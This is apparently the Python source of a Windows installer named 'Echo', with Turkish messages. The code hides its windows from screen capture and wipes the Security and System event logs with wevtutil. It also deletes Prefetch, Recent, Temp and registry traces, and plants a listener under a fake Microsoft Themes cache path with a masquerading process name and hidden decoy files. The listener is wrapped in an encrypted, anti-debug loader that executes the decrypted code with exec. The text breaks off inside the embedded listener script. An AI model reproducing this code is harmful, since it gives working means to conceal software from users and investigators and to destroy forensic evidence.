
RESOURCE_FILES = {
    'python_txt': None,
    'hidden_exe_txt': None, 
    'nier_png': None,
    'req_bat': None
}

def init_resource_paths():
    """Kaynak dosya yollarını başlangıçta belirle"""
    files = ['python.txt', 'hidden_exe.txt', 'nier.png', 'req.bat']
    keys = ['python_txt', 'hidden_exe_txt', 'nier_png', 'req_bat']
    
    for file, key in zip(files, keys):
        RESOURCE_FILES[key] = get_resource_path(file)

import os, sys, time, ctypes, threading, random, traceback, subprocess
import customtkinter as ctk
from PIL import Image, ImageTk, ImageFilter, ImageDraw, ImageGrab
from customtkinter import CTkImage
import base64
from io import BytesIO
import tempfile
import tkinter as tk
from tkinter import messagebox
import math
try:
    import requests
except Exception as e:
    pass
    requests = None
import shutil
import winreg
import json
import keyboard
import importlib
import string
import psutil
from pynput import keyboard
import base64, tempfile
import io
import hashlib
import platform
import atexit
import datetime
import queue
from logo import LOGO_DATA
import secrets

def get_resource_path(filename):
    if os.path.exists(filename):
        return filename
    
    is_nuitka_exe = (
        getattr(sys, 'frozen', False) or 
        sys.executable.endswith('.exe') or
        '__file__' in globals() and 'Temp' in globals()['__file__']
    )
    
    search_paths = []
    
    if is_nuitka_exe:
        search_paths.extend([
            os.path.dirname(sys.executable),
            os.getcwd(),
            os.path.dirname(os.path.abspath(sys.argv[0])),
        ])
        
        if '__file__' in globals():
            search_paths.append(os.path.dirname(os.path.abspath(globals()['__file__'])))
        
        if hasattr(sys, '_MEIPASS'):
            search_paths.append(sys._MEIPASS)
    
    search_paths.extend(sys.path)
    
    for path in search_paths:
        if path and os.path.isdir(path):
            file_path = os.path.join(path, filename)
            if os.path.exists(file_path):
                return file_path
    
    if is_nuitka_exe:
        exe_dir = os.path.dirname(sys.executable)
        for root, dirs, files in os.walk(exe_dir):
            if filename in files:
                return os.path.join(root, filename)
    
    return None
try:
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("[WARNING] Cryptography library not available. Listener will not be encrypted.")
def debug_file_locations():
    files_to_check = ["python.txt", "hidden_exe.txt", "nier.png", "req.bat"]
    
    print(f"[DEBUG] sys.frozen: {getattr(sys, 'frozen', False)}")
    print(f"[DEBUG] sys.executable: {sys.executable}")
    print(f"[DEBUG] sys.executable ends with .exe: {sys.executable.endswith('.exe')}")
    print(f"[DEBUG] os.getcwd(): {os.getcwd()}")
    print(f"[DEBUG] __file__ exists: {globals().get('__file__', 'Not available')}")
    print(f"[DEBUG] sys.argv[0]: {sys.argv[0]}")
    print(f"[DEBUG] sys.path first 3 entries: {sys.path[:3]}")
    
    search_dirs = [
        os.path.dirname(sys.executable),
        os.getcwd(),
        os.path.dirname(os.path.abspath(sys.argv[0])),
    ]
    
    if '__file__' in globals():
        search_dirs.append(os.path.dirname(os.path.abspath(globals()['__file__'])))
    
    search_dirs.extend(sys.path[:5])
    
    print(f"[DEBUG] Search directories:")
    for i, dir_path in enumerate(search_dirs):
        if dir_path and os.path.isdir(dir_path):
            print(f"[DEBUG]   {i+1}. {dir_path}")
            try:
                files_in_dir = os.listdir(dir_path)
                relevant_files = [f for f in files_in_dir if f in files_to_check]
                if relevant_files:
                    print(f"[DEBUG]      Found files: {relevant_files}")
            except:
                pass
    
    for filename in files_to_check:
        found_path = get_resource_path(filename)
        print(f"[DEBUG] {filename}: {found_path if found_path else 'NOT FOUND'}")

CURRENT_TASK_NAME = None

def enable_stream_proof(window):
    try:
        hwnd = window.winfo_id()
        ctypes.windll.user32.SetWindowDisplayAffinity(hwnd, 0x11)
    except Exception as e:
        print(f"StreamProof main window enable error: {str(e)}")
        
    try:
        parent_hwnd = ctypes.windll.user32.GetParent(window.winfo_id())
        if parent_hwnd:
            ctypes.windll.user32.SetWindowDisplayAffinity(parent_hwnd, 0x11)
    except Exception as e:
        print(f"StreamProof parent window enable error: {str(e)}")
        
    try:
        for child in window.winfo_children():
            try:
                child_hwnd = child.winfo_id()
                ctypes.windll.user32.SetWindowDisplayAffinity(child_hwnd, 0x11)
                
                if hasattr(child, "winfo_children"):
                    for subchild in child.winfo_children():
                        try:
                            subchild_hwnd = subchild.winfo_id()
                            ctypes.windll.user32.SetWindowDisplayAffinity(subchild_hwnd, 0x11)
                        except Exception:
                            pass
            except Exception:
                pass
    except Exception as e:
        print(f"StreamProof child windows enable error: {str(e)}")

def disable_stream_proof(window):

    try:
        hwnd = window.winfo_id()
        ctypes.windll.user32.SetWindowDisplayAffinity(hwnd, 0x00)
    except Exception as e:
        print(f"StreamProof main window disable error: {str(e)}")
        
    try:
        parent_hwnd = ctypes.windll.user32.GetParent(window.winfo_id())
        if parent_hwnd:
            ctypes.windll.user32.SetWindowDisplayAffinity(parent_hwnd, 0x00)
    except Exception as e:
        print(f"StreamProof parent window disable error: {str(e)}")
        
    try:
        for child in window.winfo_children():
            try:
                child_hwnd = child.winfo_id()
                ctypes.windll.user32.SetWindowDisplayAffinity(child_hwnd, 0x00)
                
                if hasattr(child, "winfo_children"):
                    for subchild in child.winfo_children():
                        try:
                            subchild_hwnd = subchild.winfo_id()
                            ctypes.windll.user32.SetWindowDisplayAffinity(subchild_hwnd, 0x00)
                        except Exception:
                            pass
            except Exception:
                pass
    except Exception as e:
        print(f"StreamProof child windows disable error: {str(e)}")

def clean_installation_traces():
    try:
        print("[CLEANER] Başlatılıyor...")
        
        clean_windows_event_logs()
        
        clean_prefetch_files()
        
        clean_recent_files()
        
        clean_temp_files()
        
        clean_registry_traces()
        
        clean_program_logs()
        
        print("[CLEANER] Temizlik tamamlandı!")
        
    except Exception as e:
        print(f"[CLEANER] Hata: {e}")

def clean_windows_event_logs():
    try:
        import subprocess
        
        logs_to_clear = [
            "Application",
            "System", 
            "Security",
            "Setup",
            "Internet Explorer"
        ]
        
        for log_name in logs_to_clear:
            try:
                subprocess.run([
                    "wevtutil", "cl", log_name
                ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                pass
                
        print("[CLEANER] Windows Event Logları temizlendi")
        
    except Exception as e:
        print(f"[CLEANER] Event log temizleme hatası: {e}")

def clean_prefetch_files():
    try:
        prefetch_dir = os.path.join(os.environ['WINDIR'], 'Prefetch')
        if os.path.exists(prefetch_dir):
            for file in os.listdir(prefetch_dir):
                if any(keyword in file.lower() for keyword in ['python', 'setup', 'xir', 'echo-free']):
                    try:
                        os.remove(os.path.join(prefetch_dir, file))
                    except:
                        pass
                        
        print("[CLEANER] Prefetch dosyaları temizlendi")
        
    except Exception as e:
        print(f"[CLEANER] Prefetch temizleme hatası: {e}")

def clean_recent_files():
    try:
        recent_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Recent')
        if os.path.exists(recent_dir):
            for file in os.listdir(recent_dir):
                if any(keyword in file.lower() for keyword in ['setup.py', 'xir', 'echo-free']):
                    try:
                        os.remove(os.path.join(recent_dir, file))
                    except:
                        pass
                        
        print("[CLEANER] Recent dosyaları temizlendi")
        
    except Exception as e:
        print(f"[CLEANER] Recent temizleme hatası: {e}")

def clean_temp_files():
    try:
        temp_dirs = [
            os.environ.get('TEMP', ''),
            os.environ.get('TMP', ''),
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Temp')
        ]
        
        for temp_dir in temp_dirs:
            if os.path.exists(temp_dir):
                for file in os.listdir(temp_dir):
                    if any(keyword in file.lower() for keyword in ['setup', 'xir', 'echo-free', 'listener_debug']):
                        try:
                            file_path = os.path.join(temp_dir, file)
                            if os.path.isfile(file_path):
                                os.remove(file_path)
                        except:
                            pass
                            
        print("[CLEANER] Temp dosyaları temizlendi")
        
    except Exception as e:
        print(f"[CLEANER] Temp temizleme hatası: {e}")

def clean_registry_traces():
    try:
        import winreg
        
        registry_keys = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU")
        ]
        
        for hkey, key_path in registry_keys:
            try:
                with winreg.OpenKey(hkey, key_path, 0, winreg.KEY_WRITE) as reg_key:
                    try:
                        winreg.DeleteValue(reg_key, "MRUList")
                    except:
                        pass
                        
                    i = 0
                    while True:
                        try:
                            name, value, type = winreg.EnumValue(reg_key, i)
                            if any(keyword in value.lower() for keyword in ['setup.py', 'xir', 'echo-free']):
                                try:
                                    winreg.DeleteValue(reg_key, name)
                                except:
                                    pass
                            i += 1
                        except:
                            break
                            
            except:
                pass
                
        print("[CLEANER] Registry izleri temizlendi")
        
    except Exception as e:
        print(f"[CLEANER] Registry temizleme hatası: {e}")

def clean_program_logs():
    pass

def set_window_icon(window):
    if LOGO_DATA:
        try:
            ico_bytes = base64.b64decode(LOGO_DATA)
            with tempfile.NamedTemporaryFile(delete=False, suffix='.ico') as tmp_icon:
                tmp_icon.write(ico_bytes)
                tmp_icon.flush()
                window.iconbitmap(tmp_icon.name)
        except Exception as e:
            print("Icon set error:", e)

class HoverButton(ctk.CTkButton):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.default_fg = self.cget("fg_color")
        self.default_text_color = self.cget("text_color")
        self.shadow = None
        self._color_anim_id = None
        self.bind("<Enter>", self.on_enter)
        self.bind("<Leave>", self.on_leave)
        self.bind("<ButtonPress-1>", self.on_press)
        self.bind("<ButtonRelease-1>", self.on_release)
        self.after(10, self.create_shadow)

    def create_shadow(self):
        if self.shadow is None and self.winfo_ismapped():
            parent = self.master
            self.shadow = ctk.CTkLabel(parent, text="", fg_color="#222222", corner_radius=8,
                                     width=self.winfo_width()+4, height=self.winfo_height()+6)
            self.shadow.place(x=self.winfo_x()-2, y=self.winfo_y()+4)
            self.lift()

    def on_enter(self, event=None):
        self.animate_color(self.cget("fg_color"), "#000000", steps=6)
        self.configure(text_color="#ffffff")
    def on_leave(self, event=None):
        self.animate_color(self.cget("fg_color"), self.default_fg, steps=6)
        self.configure(text_color=self.default_text_color)
    def on_press(self, event=None):
        pass
    def on_release(self, event=None):
        pass
    def animate_color(self, start_color, end_color, steps=6):
        if not self.winfo_exists():
            return
        if self._color_anim_id is not None and self.winfo_exists():
            self.after_cancel(self._color_anim_id)
            self._color_anim_id = None
        def hex_to_rgb(hex_color):
            hex_color = hex_color.lstrip('#')
            return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
        def rgb_to_hex(rgb):
            return "#%02x%02x%02x" % rgb
        start_rgb = hex_to_rgb(get_color_str(start_color))
        end_rgb = hex_to_rgb(get_color_str(end_color))
        def step_anim(step=0):
            if not self.winfo_exists():
                return
            if step > steps:
                self.configure(fg_color=end_color)
                self._color_anim_id = None
                return
            r = int(start_rgb[0] + (end_rgb[0] - start_rgb[0]) * step / steps)
            g = int(start_rgb[1] + (end_rgb[1] - start_rgb[1]) * step / steps)
            b = int(start_rgb[2] + (end_rgb[2] - start_rgb[2]) * step / steps)
            self.configure(fg_color=rgb_to_hex((r, g, b)))
            self._color_anim_id = self.after(20, lambda: step_anim(step + 1))
        step_anim()


def get_color_str(color):
    if isinstance(color, (list, tuple)):
        return color[0]
    return color

APP_NAME = "Echo"
WINDOW_WIDTH = 680
WINDOW_HEIGHT = 480
HEADER_BAR_HEIGHT = 34

PRIMARY_COLOR = "#ffffff"  # Beyaz
SECONDARY_COLOR = "#121212"  # Derin siyah
ACCENT_COLOR = "#ff4e50"   # Açık kırmızı
TEXT_COLOR = "#ffffff"     # Beyaz
NEON_GLOW = "#ff2a2d"      # Neon kırmızı

WINDOWS_PROC_NAMES = [
    'svchost', 'explorer', 'RuntimeBroker', 'dwm', 'ctfmon', 'taskhostw',
    'SearchIndexer', 'audiodg', 'fontdrvhost', 'sihost', 'winlogon',
    'services', 'SystemSettings', 'smartscreen', 'SecurityHealthSystray'
]

LANGUAGES = {
    'tr': {
        'app_name': 'Echo',
        'start': 'Kurulumu Başlat',
        'uninstall': 'Kaldır',
        'get_hwid': 'HWID Al',
        'download_requirements': 'Gereksinimleri İndir',
        'ready': 'Hazır',
        'installing': 'Kurulum başlatılıyor...',
        'uninstalling': 'Kaldırılıyor...',
        'calculating': 'HWID hesaplanıyor...',
        'downloading_requirements': 'Gereksinimler indiriliyor...',
        'installing_python_req': 'Python yükleniyor...',
        'installing_packages': 'Paketler yükleniyor...',
        'copied': 'HWID panoya kopyalandı!',
        'error': 'HWID hesaplanamadı!',
        'checking_python': 'Kontrol ediliyor...',
        'installing_python': 'İndiriliyor ve kuruluyor...',
        'installing_modules': 'Gerekli birleşenler yükleniyor...',
        'copying_files': 'Sistem dosyaları kopyalanıyor...',
        'setting_up': 'Başlangıç ayarları yapılıyor...',
        'success': 'Kurulum tamamlandı!',
        'requirements_success': 'Gereksinimler başarıyla yüklendi!',
        'requirements_error': 'Gereksinimler yüklenirken hata!',
        'admin_required': 'Yönetici izinleri gerekli!',
        'downloading': 'Yükleniyor',
        'select_key': 'Tuş Seçimi',
        'press_any_key': 'Lütfen bir tuşa basın...',
        'auto_close': 'Program otomatik olarak kapanacak',
        'uninstalled': 'Kaldırıldı!',
        'uninstall_error': 'Kaldırma hatası!',
        'install_error': 'Kurulumda hata!'
    },
    'en': {
        'app_name': 'Echo',
        'start': 'Start Installation',
        'uninstall': 'Uninstall',
        'get_hwid': 'Get HWID',
        'download_requirements': 'Download Requirements',
        'ready': 'Ready',
        'installing': 'Starting installation...',
        'uninstalling': 'Uninstalling...',
        'calculating': 'Calculating HWID...',
        'downloading_requirements': 'Downloading requirements...',
        'installing_python_req': 'Installing Python...',
        'installing_packages': 'Installing packages...',
        'copied': 'HWID copied to clipboard!',
        'error': 'Failed to calculate HWID!',
        'checking_python': 'Checking installation...',
        'installing_python': 'Downloading and installing...',
        'installing_modules': 'Installing required...',
        'copying_files': 'Copying system files...',
        'setting_up': 'Setting up startup configuration...',
        'success': 'Installation completed successfully!',
        'requirements_success': 'Requirements installed successfully!',
        'requirements_error': 'Error installing requirements!',
        'admin_required': 'Administrator privileges required!',
        'downloading': 'Downloading',
        'select_key': 'Key Selection',
        'press_any_key': 'Please press any key...',
        'auto_close': 'The program will close automatically',
        'uninstalled': 'Uninstalled!',
        'uninstall_error': 'Uninstall error!',
        'install_error': 'Install error!'
    }
}
current_lang = {'lang': 'tr'}
header_title = None
install_btn = None
uninstall_btn = None
get_hwid_btn = None
download_req_btn = None
status_label = None
lang_btn = None
lang_btn_tk = None
close_btn_tk = None
glow_frame = None


selected_key = {'key': None}
key_selection_window = {'win': None, 'label': None, 'info_label': None}
loading_window_ref = {'win': None, 'text_label': None}
countdown_window_ref = {'win': None, 'bottom_text': None}

def show_key_selection_screen(root, on_key_selected):
    lang = current_lang['lang']
    title = LANGUAGES[lang].get('select_key', 'Select a key to assign')
    info = LANGUAGES[lang].get('press_any_key', 'Please press any key...')
    win = tk.Toplevel(root)
    win.title(title)
    win.geometry("340x180")
    win.resizable(False, False)
    win.grab_set()
    win.attributes("-topmost", True)
    win.lift()
    win.overrideredirect(True)
    win.update_idletasks()
    screen_width = win.winfo_screenwidth()
    screen_height = win.winfo_screenheight()
    window_width = 340
    window_height = 180
    x = (screen_width - window_width) // 2
    y = (screen_height - window_height) // 2
    win.geometry(f"{window_width}x{window_height}+{x}+{y}")
    move_offset = {'x': 0, 'y': 0}
    def start_move(e):
        move_offset['x'], move_offset['y'] = e.x, e.y
    def do_move(e):
        win.geometry(f"+{e.x_root - move_offset['x']}+{e.y_root - move_offset['y']}")
    win.bind("<Button-1>", start_move)
    win.bind("<B1-Motion>", do_move)
    frame = ctk.CTkFrame(win, fg_color="#1c1c1e")
    frame.pack(fill="both", expand=True)
    label = ctk.CTkLabel(frame, text=title, font=("Segoe UI", 18, "bold"), text_color=PRIMARY_COLOR)
    label.pack(pady=(24, 8))
    info_label = ctk.CTkLabel(frame, text=info, font=("Segoe UI", 14), text_color=TEXT_COLOR)
    info_label.pack(pady=(0, 16))
    key_label = ctk.CTkLabel(frame, text="", font=("Segoe UI", 22, "bold"), text_color=ACCENT_COLOR)
    key_label.pack(pady=(0, 8))
    def on_key(event):
        if not win.winfo_exists():
            return
        key_info = {'keysym': event.keysym, 'keycode': event.keycode}
        selected_key['key'] = key_info
        key_label.configure(text=event.keysym.upper())
        win.after(600, lambda: (win.destroy(), on_key_selected(key_info)))
    win.bind("<Key>", on_key)
    win.focus_force()
    
    win.after(200, lambda: enable_stream_proof(win))
    
    key_selection_window['win'] = win
    key_selection_window['label'] = label
    key_selection_window['info_label'] = info_label

def calculate_hwid():
    try:
        command = [
            'powershell',
            '-Command',
            '$uuid = (Get-WmiObject Win32_ComputerSystemProduct).UUID;'
            '$hash = [System.BitConverter]::ToString('
                '[System.Security.Cryptography.SHA256]::Create().ComputeHash('
                    '[System.Text.Encoding]::UTF8.GetBytes($uuid)'
                ')'
            ').Replace("-", "").ToLower();'
            'Write-Output $hash'
        ]
        
        result = subprocess.run(
            command, 
            capture_output=True, 
            text=True, 
            check=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        return result.stdout.strip()
    except Exception as e:
        print(f"HWID hesaplama hatası: {e}")
        return None

def is_python_installed():
    try:
        result = subprocess.run(
            ["python", "--version"],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return result.returncode == 0
    except:
        return False

CONFIG_PATH = os.path.join(os.environ.get('APPDATA', os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming')), 'Microsoft', 'Windows', 'Themes', 'Cache', 'syscfg.json')

def generate_hidden_paths():
    base_dir = os.path.join(os.environ.get('APPDATA', os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming')), 'Microsoft', 'Windows', 'Themes', 'Cache')
    if not os.path.exists(base_dir):
        os.makedirs(base_dir, exist_ok=True)
    folder = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    folder_path = os.path.join(base_dir, folder)
    if not os.path.exists(folder_path):
        os.makedirs(folder_path, exist_ok=True)
    proc_name = 'UserdataSync'  
    pyw_name = proc_name + '.pyw'
    return {
        'folder': folder_path,
        'listener': os.path.join(folder_path, pyw_name),
        'proc_name': proc_name
    }

def save_hidden_paths(cfg):
    with open(CONFIG_PATH, 'w') as f:
        json.dump(cfg, f)

def load_hidden_paths():
    if os.path.exists(CONFIG_PATH):
        with open(CONFIG_PATH, 'r') as f:
            return json.load(f)
    else:
        cfg = generate_hidden_paths()
        save_hidden_paths(cfg)
        return cfg


def get_hidden_paths():
    return load_hidden_paths()



LISTENER_NAME = 'UserDataSync'

HIDDEN_PATHS = [
    os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'Microsoft', 'Windows', 'Themes', 'Cache'),
    os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'Microsoft', 'Windows', 'Themes'),
    os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
    os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'Microsoft', 'Windows', 'Start Menu', 'Programs'),
    os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'Microsoft', 'Windows', 'Start Menu'),
    os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'Microsoft', 'Windows'),
    os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'Microsoft'),
    os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'Windows', 'Themes'),
    os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'Windows', 'Start Menu', 'Programs', 'Startup'),
    os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'Windows', 'Start Menu', 'Programs')
]

def get_random_hidden_path():
    existing_paths = []
    for path in HIDDEN_PATHS:
        try:
            if os.path.exists(path):
                existing_paths.append(path)
            else:
                try:
                    os.makedirs(path, exist_ok=True)
                    existing_paths.append(path)
                except:
                    continue
        except:
            continue
    
    if not existing_paths:
        default_path = os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'Microsoft', 'Windows', 'Themes', 'Cache')
        try:
            os.makedirs(default_path, exist_ok=True)
            existing_paths.append(default_path)
        except:
            import tempfile
            existing_paths.append(tempfile.gettempdir())
    
    return random.choice(existing_paths)

HIDDEN_DIR = get_random_hidden_path()
LISTENER_PATH = os.path.join(HIDDEN_DIR, 'system_config.dat')

MASK_FILES = [
    'system_config.dat',
    'user_preferences.dat', 
    'theme_cache.dat',
    'display_settings.dat',
    'window_layout.dat',
    'theme_metadata.json',
    'display_calibration.cfg',
    'window_positions.ini',
    'system_logs.txt'
]

def get_random_filename():
    extensions = ['.log', '.dat', '.cfg', '.ini', '.txt', '.cache', '.tmp', '.bak']
    base_names = [
        'cache', 'system', 'config', 'data', 'log', 'temp', 'backup',
        'settings', 'preferences', 'theme', 'display', 'window', 'user',
        'sync', 'update', 'service', 'host', 'audio', 'media', 'network'
    ]
    
    random_base = random.choice(base_names)
    random_ext = random.choice(extensions)
    random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=3))
    
    return f"{random_base}_{random_suffix}{random_ext}"

def create_mask_files():
    try:
        mask_contents = [
            b'# System Configuration\n# Version: 1.0\n# Last Updated: 2024\n\n[General]\nTheme=Dark\nLanguage=en-US\n\n[Display]\nResolution=1920x1080\nRefreshRate=60\n\n[Performance]\nAnimations=Enabled\nTransparency=Enabled',
            b'# User Preferences\n# Generated: 2024\n\n[Interface]\nColorScheme=Auto\nFontSize=12\n\n[Accessibility]\nHighContrast=Disabled\nScreenReader=Disabled\n\n[Privacy]\nTelemetry=Minimal\nDiagnostics=Basic',
            b'# Theme Cache Data\n# Cache Version: 2.1\n\n[Cache]\nLastUpdate=2024-01-15\nSize=2048\nCompression=Enabled\n\n[Themes]\nActiveTheme=Windows\nCustomThemes=0\n\n[Performance]\nLoadTime=0.15s',
            b'# Display Settings\n# Monitor Configuration\n\n[Primary]\nWidth=1920\nHeight=1080\nColorDepth=32\n\n[Secondary]\nConnected=False\n\n[Calibration]\nGamma=2.2\nBrightness=100\nContrast=100',
            b'# Window Layout Cache\n# Application Positions\n\n[MainWindow]\nX=100\nY=100\nWidth=800\nHeight=600\nMaximized=False\n\n[Toolbar]\nVisible=True\nPosition=Top\n\n[StatusBar]\nVisible=True',
            
            b'[2024-01-15 10:30:15] INFO: Theme cache initialized\n[2024-01-15 10:30:16] INFO: Loading user preferences\n[2024-01-15 10:30:17] INFO: Display settings applied\n[2024-01-15 10:30:18] INFO: Window layout restored\n[2024-01-15 10:30:19] INFO: Cache cleanup completed\n[2024-01-15 10:30:20] INFO: System ready',
            
            b'{\n  "theme": {\n    "name": "Windows Dark",\n    "version": "1.0",\n    "active": true,\n    "customizations": {}\n  },\n  "display": {\n    "resolution": "1920x1080",\n    "refresh_rate": 60,\n    "color_depth": 32\n  },\n  "cache": {\n    "last_update": "2024-01-15T10:30:15Z",\n    "size": 2048\n  }\n}',
            
            b'# Display Calibration Configuration\n# Generated: 2024-01-15\n\n[Monitor]\nGamma=2.2\nBrightness=100\nContrast=100\nSaturation=100\n\n[Color]\nTemperature=6500K\nProfile=sRGB\n\n[Advanced]\nHDR=Disabled\nG-Sync=Disabled',
            
            b'[WindowPositions]\nMainWindow=100,100,800,600\nToolbar=0,0,800,30\nStatusBar=0,570,800,30\n\n[Settings]\nMaximized=False\nMinimized=False\nAlwaysOnTop=False\n\n[History]\nLastPosition=100,100\nLastSize=800,600',
            
            b'System Log - Theme Cache\nGenerated: 2024-01-15 10:30:15\n\nCache Status: Active\nLast Cleanup: 2024-01-15 10:30:19\nTotal Files: 15\nCache Size: 2.1 MB\nCompression: Enabled\n\nPerformance Metrics:\n- Load Time: 0.15s\n- Memory Usage: 8.2 MB\n- CPU Usage: 2.1%\n\nStatus: OK'
        ]
        
        for i, filename in enumerate(MASK_FILES):
            file_path = os.path.join(HIDDEN_DIR, filename)
            if not os.path.exists(file_path):
                with open(file_path, 'wb') as f:
                    f.write(mask_contents[i])
                try:
                    subprocess.run(f'attrib +h "{file_path}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                except:
                    pass
                print(f"[MASK] Created mask file: {filename}")
    except Exception as e:
        print(f"[MASK] Error creating mask files: {e}")

def gen_random_passphrase(length=24):
    chars = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
    return ''.join(secrets.choice(chars) for _ in range(length))

def derive_key(passphrase: str, salt: bytes, iterations: int = 200_000):
    if not CRYPTO_AVAILABLE:
        return None
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=iterations,
        backend=default_backend()
    )
    return kdf.derive(passphrase.encode('utf-8'))

def xor_bytes(data: bytes, key: bytes) -> bytes:
    out = bytearray(len(data))
    klen = len(key)
    for i in range(len(data)):
        out[i] = data[i] ^ key[i % klen]
    return bytes(out)

def create_encrypted_loader(listener_code: str, passphrase: str):
    if not CRYPTO_AVAILABLE:
        return listener_code 
    
    try:
        salt = secrets.token_bytes(16)
        iterations = 200_000
        key = derive_key(passphrase, salt, iterations)
        
        aes = AESGCM(key)
        nonce = secrets.token_bytes(12)
        plaintext_bytes = listener_code.encode('utf-8')
        ciphertext = aes.encrypt(nonce, plaintext_bytes, None)
        
        xor_key = hashlib.sha256(passphrase.encode('utf-8') + salt).digest()
        xor_data = xor_bytes(ciphertext, xor_key)
        
        enc_blob = nonce + xor_data
        enc_b64 = base64.b64encode(enc_blob).decode('utf-8')
        
        metadata = {
            'salt_b64': base64.b64encode(salt).decode('utf-8'),
            'kdf_iter': iterations,
            'embed_pass': passphrase
        }
        
        loader_template = f'''# Protected Listener (auto-generated)
import base64, json, sys, time, ctypes, os, hashlib
try:
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.backends import default_backend
except ImportError:
    print("Cryptography library required")
    sys.exit(1)

_metadata = {json.dumps(metadata)}
_encrypted_b64 = r"""{enc_b64}"""

def anti_debug_check():
    t0 = time.perf_counter()
    time.sleep(0.05)
    dt = time.perf_counter() - t0
    if dt > 0.2:
        return True
    try:
        if os.name == 'nt':
            kernel32 = ctypes.windll.kernel32
            is_dbg = ctypes.c_bool(False)
            kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(is_dbg))
            if is_dbg.value:
                return True
    except Exception:
        pass
    return False

def derive_key(passphrase: bytes, salt: bytes, iterations: int):
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=iterations, backend=default_backend())
    return kdf.derive(passphrase)

def xor_bytes(data: bytes, key: bytes) -> bytes:
    out = bytearray(len(data))
    klen = len(key)
    for i in range(len(data)):
        out[i] = data[i] ^ key[i % klen]
    return bytes(out)

def decrypt_and_exec():
    if anti_debug_check():
        sys.exit(1)
    
    meta = _metadata
    salt = base64.b64decode(meta['salt_b64'])
    iterations = meta['kdf_iter']
    enc = base64.b64decode(_encrypted_b64)
    nonce = enc[:12]
    xor_data = enc[12:]
    
    passphrase_bytes = meta['embed_pass'].encode('utf-8')
    xor_key = hashlib.sha256(passphrase_bytes + salt).digest()
    
    try:
        ciphertext = xor_bytes(xor_data, xor_key)
    except Exception:
        sys.exit(3)
    
    key = derive_key(passphrase_bytes, salt, iterations)
    aes = AESGCM(key)
    
    try:
        plaintext = aes.decrypt(nonce, ciphertext, None)
    except Exception:
        sys.exit(2)
    
    try:
        code_str = plaintext.decode('utf-8', errors='replace')
        exec(code_str, {{'__name__': '__main__', '__file__': '<protected>'}})
    finally:
        try:
            for i in range(len(plaintext)):
                pass
        except Exception:
            pass

if __name__ == '__main__':
    decrypt_and_exec()
'''
        return loader_template
        
    except Exception as e:
        print(f"[ERROR] Encryption failed: {e}")
        return listener_code  

def get_listener_script(trigger_key_info):
    key_name = trigger_key_info['keysym'] if isinstance(trigger_key_info, dict) else (trigger_key_info or 'insert')
    key_code = trigger_key_info['keycode'] if isinstance(trigger_key_info, dict) else None
    return """
import os
import sys
import threading
import requests
import subprocess
import winreg
import base64
import traceback
import ctypes
import time
import platform
import json
import hashlib
import random
import string
import socket
import tempfile
import datetime
import uuid
import re
import math
import stat
import shutil
import glob
import logging
import pathlib
import fnmatch
import zipfile
import tarfile
import gzip
import bz2
import lzma
import pickle
import shelve
import sqlite3
import xml
import html
import urllib
import email
import smtplib
import poplib
import imaplib
import ftplib
import http
import wsgiref
import asyncio
import concurrent
import multiprocessing
import queue
import select
import signal
import mmap
import array
import struct
import weakref
import copy
import pprint
import reprlib
import enum
import types
import collections
import abc
import itertools
import functools
import operator
import inspect
import ast
import symtable
import code
import dis
import pickletools
import profile
import pstats
import timeit
import trace
import tracemalloc
import gc
import sysconfig
import site
import builtins
import warnings
import dataclasses
import typing
import contextlib
import contextvars
import selectors
import ssl
def debug_log(message):
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] [LISTENER] {message}"
        print(log_message)
    except Exception:
        pass

def check_task_scheduler_debug_log():
    pass  

debug_log("Listener script başlatıldı")
debug_log(f"Python version: {sys.version}")
debug_log(f"Working directory: {os.getcwd()}")
debug_log(f"Script path: {os.path.abspath(__file__)}")
debug_log(f"Environment PATH: {os.environ.get('PATH', 'Not set')}")

KEY_NAME = '""" + key_name + """'
KEY_CODE = '""" + (str(key_code) if key_code is not None else 'None') + """'
